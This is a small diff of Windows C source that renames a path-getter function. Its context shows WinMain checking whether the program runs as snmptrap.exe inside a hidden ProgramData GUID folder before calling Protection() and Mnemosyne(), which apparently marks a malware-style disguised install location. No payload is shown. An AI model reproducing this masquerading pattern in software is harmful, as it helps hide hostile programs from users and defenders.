@@ -36,7 +36,7 @@ BOOL isFileExists(LPCTSTR szPath)
 /*
 	Full Path Getter
 */
-char* GetFullPathFromProcId(DWORD pId)
+char* GetFullPath()
 {
 	wchar_t buffer[MAX_PATH];
 	GetModuleFileName(NULL, buffer, MAX_PATH);
@@ -166,7 +166,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
 	if (isFileExists("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe"))
 	{
-		if (strcmp(GetFullPathFromProcId(GetCurrentProcessId()), "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe") == 0)
+		if (strcmp(GetFullPath(), "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe") == 0)
 		{
 			Protection();
 			Mnemosyne();
